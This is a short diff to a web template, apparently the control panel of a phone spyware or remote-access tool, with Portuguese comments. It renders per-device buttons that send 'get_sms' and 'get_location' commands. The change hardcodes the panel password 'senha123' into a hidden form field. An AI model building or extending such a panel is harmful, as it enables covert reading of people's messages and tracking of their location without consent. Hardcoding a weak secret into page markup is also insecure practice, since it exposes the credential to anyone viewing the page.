@@ -35,7 +35,7 @@
             <td>
                 <!-- Formulário pra mandar comando -->
                 <form action="/send-command" method="POST" style="display:inline;">
-                    <input type="hidden" name="pw" value="<%= request.query.pw %>">
+                    <input type="hidden" name="pw" value="senha123">
                     <input type="hidden" name="device_id" value="<%= id %>">
                     <button name="command" value="get_sms" class="btn">SMS</button>
                     <button name="command" value="get_location" class="btn">Loc</button>
